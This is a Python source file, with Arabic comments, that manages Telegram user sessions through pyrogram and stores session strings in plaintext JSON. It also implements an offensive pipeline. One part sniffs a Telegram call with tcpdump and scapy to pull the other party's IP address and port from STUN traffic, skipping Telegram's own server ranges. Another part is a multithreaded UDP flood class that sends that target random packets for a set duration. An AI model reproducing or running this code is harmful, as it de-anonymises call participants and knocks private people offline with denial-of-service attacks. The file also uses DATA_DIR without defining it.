import asyncio
import json
import os
import socket
import subprocess
import threading
import time
from typing import Dict, List, Optional, Tuple

from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired

from config import API_ID, API_HASH, SESSIONS_DIR

SESSIONS_FILE = os.path.join(SESSIONS_DIR, "sessions.json")

# نطاقات خوادم تليجرام المستبعدة
EXCLUDED_NETWORKS = [
    '91.108.13.0/24', '149.154.160.0/21', '185.76.151.0/24',
    '91.105.192.0/23', '91.108.12.0/22', '91.108.16.0/22',
    '91.108.20.0/22', '91.108.4.0/22', '91.108.56.0/22',
    '95.161.64.0/20'
]

# ============== إدارة الجلسات ==============
def load_sessions() -> Dict:
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_sessions(sessions: Dict):
    with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

async def add_session(phone: str, session_string: str, name: str = "") -> bool:
    sessions = load_sessions()
    sessions[phone] = {
        "phone": phone,
        "session_string": session_string,
        "name": name,
        "added_at": time.time()
    }
    save_sessions(sessions)
    return True

async def remove_session(phone: str) -> bool:
    sessions = load_sessions()
    if phone in sessions:
        del sessions[phone]
        save_sessions(sessions)
        return True
    return False

async def get_session_string(phone: str) -> Optional[str]:
    sessions = load_sessions()
    if phone in sessions:
        return sessions[phone].get("session_string")
    return None

async def login_telegram(phone: str, code_callback=None, password_callback=None) -> tuple:
    """تسجيل الدخول والحصول على session string مع دعم التحقق بخطوتين"""
    client = Client(f"temp_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        sent_code = await client.send_code(phone)

        if code_callback:
            code = await code_callback()
        else:
            code = input(f"Enter code for {phone}: ")

        try:
            await client.sign_in(phone, sent_code.phone_code_hash, code)
        except SessionPasswordNeeded:
            if password_callback:
                password = await password_callback()
            else:
                password = input("Enter 2FA password: ")
            await client.check_password(password)

        me = await client.get_me()
        session_string = await client.export_session_string()
        name = me.first_name or phone
        return True, session_string, name, None

    except (PhoneCodeInvalid, PhoneCodeExpired) as e:
        return False, None, None, str(e)
    except Exception as e:
        return False, None, None, str(e)
    finally:
        await client.disconnect()

async def get_client(phone: str) -> Optional[Client]:
    session_string = await get_session_string(phone)
    if not session_string:
        return None
    try:
        client = Client(f"client_{phone}", api_id=API_ID, api_hash=API_HASH,
                        session_string=session_string, in_memory=True)
        await client.start()
        return client
    except Exception:
        return None

# ============== هجوم UDP Flood ==============
class UDPFlood:
    def __init__(self, target_ip: str, target_port: int, duration: int,
                 packet_size: int, threads: int, pps_limit: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.threads = threads
        self.pps_limit = pps_limit
        self.stop_flag = False
        self.total_packets = 0
        self.lock = threading.Lock()
        self.start_time = 0.0

    def _generate_payload(self) -> bytes:
        return os.urandom(self.packet_size)

    def _worker(self, worker_id: int):
        end_time = self.start_time + self.duration
        local_count = 0
        delay = 1.0 / self.pps_limit if self.pps_limit > 0 else 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = self._generate_payload()
        while time.time() < end_time and not self.stop_flag:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                local_count += 1
            except:
                pass
            if delay > 0:
                time.sleep(delay)
        sock.close()
        with self.lock:
            self.total_packets += local_count

    def start(self) -> Tuple[int, float]:
        self.start_time = time.time()
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_flag = True
        for t in threads:
            t.join(timeout=1)
        elapsed = time.time() - self.start_time
        return self.total_packets, elapsed

# ============== استخراج الـ IP من المكالمة ==============
def check_tcpdump() -> bool:
    try:
        subprocess.run(['tcpdump', '--version'], capture_output=True, check=True)
        return True
    except:
        return False

def is_excluded_ip(ip: str) -> bool:
    for network in EXCLUDED_NETWORKS:
        try:
            import ipaddress
            if ipaddress.ip_address(ip) in ipaddress.ip_network(network):
                return True
        except:
            pass
    return False

def is_local_ip(ip: str) -> bool:
    try:
        import ipaddress
        ip_addr = ipaddress.ip_address(ip)
        return ip_addr.is_private or ip_addr.is_loopback
    except:
        return True

async def extract_target_from_call(interface: str, timeout: int = 30) -> Tuple[Optional[str], Optional[int]]:
    """استخراج IP والمنفذ من حركة STUN أثناء المكالمة"""
    if not check_tcpdump():
        return None, None

    pcap_file = os.path.join(DATA_DIR, "capture_temp.pcap")
    cmd = f"timeout {timeout} tcpdump -i {interface} -w {pcap_file} -c 200 2>/dev/null"
    os.system(cmd)

    if not os.path.exists(pcap_file) or os.path.getsize(pcap_file) == 0:
        return None, None

    try:
        from scapy.all import rdpcap, IP, UDP
        packets = rdpcap(pcap_file)
        detected = {}

        for pkt in packets:
            if IP in pkt and UDP in pkt:
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                sport = pkt[UDP].sport
                dport = pkt[UDP].dport

                # نركز على منافذ STUN/TURN/RTP الخاصة بتليجرام
                if sport in [3478, 5349, 443, 1400] or dport in [3478, 5349, 443, 1400]:
                    for ip, port in [(src_ip, sport), (dst_ip, dport)]:
                        if is_excluded_ip(ip) or is_local_ip(ip):
                            continue
                        if ip not in detected:
                            detected[ip] = {'port': port, 'count': 0}
                        detected[ip]['count'] += 1

        if not detected:
            return None, None

        # اختيار الهدف الأكثر ظهوراً
        target_ip = max(detected.items(), key=lambda x: x[1]['count'])[0]
        target_port = detected[target_ip]['port']
        return target_ip, target_port

    except Exception:
        return None, None
    finally:
        if os.path.exists(pcap_file):
            os.remove(pcap_file)